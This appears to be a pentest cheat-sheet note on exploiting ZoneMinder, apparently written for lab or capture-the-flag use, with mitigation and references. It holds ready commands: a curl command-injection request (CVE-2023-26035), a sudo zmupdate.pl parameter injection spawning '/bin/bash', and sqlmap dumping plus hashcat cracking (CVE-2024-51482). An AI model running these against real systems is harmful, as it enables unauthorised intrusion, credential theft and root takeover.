---
topic: ZoneMinder and command execution
tags: [linux, zoneminder, cve, command-injection, privesc]
---

# ZoneMinder and command execution

[🌐 Español](zoneminder-command-injection.md) | **English**

## Concept

ZoneMinder exposes panels and maintenance scripts. Some versions allow unauthenticated command execution through the `snapshot` action, and privileged `zm*.pl` scripts pass parameters to a shell. Both paths can lead from `www-data` to root.

## When it applies

- ZoneMinder is on version 1.36.32 or similar.
- The panel or `zm*.pl` scripts are reachable.
- `sudo -l` allows ZoneMinder scripts.

## Procedure

1. Confirm the version and vulnerable endpoint.
2. Send the CVE-2023-26035 payload or inject into the script parameter.
3. Catch the shell as `www-data` or root.
4. Enumerate the database and configuration files.

```bash
curl -s 'http://<IP>/zm/index.php?view=request&request=snapshot&id=1&command=<PAYLOAD>'
sudo -l
sudo /usr/bin/zmupdate.pl --user='; /bin/bash #'
```

### Variant: SQLi in ZoneMinder 1.37.63 (CCTV)

CCTV uses CVE-2024-51482, a blind SQLi in event handling. With a valid session, dump the database, crack a user's bcrypt hash and log in over SSH. From there, `tcpdump` captures cleartext credentials and motionEye is exploited with CVE-2025-60787 to reach root.

```bash
sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=...' \
  --cookie='ZMSESSID=<SESSION>' --batch --dump
hashcat -m 3200 zm.hashes rockyou.txt
```

## Variants

- Use `LD_PRELOAD` with a privileged Perl script.
- Abuse CVE-2024-51482 to dump users and reuse the password.
- Write PHP into the webroot.
- Use database credentials for the panel.

## Limitations

- The version must be vulnerable.
- The endpoint must accept the parameter.
- Scripts may have different paths or names.

## Mitigation and detection

- Update ZoneMinder and restrict the panel.
- Do not grant `sudo` on scripts with parameters.
- Audit child processes and `zm*.pl` access.

## References

- <https://nvd.nist.gov/vuln/detail/CVE-2023-26035>
- <https://nvd.nist.gov/vuln/detail/CVE-2024-51482>
- <https://zoneminder.com/>
- <https://attack.mitre.org/techniques/T1059/004/>
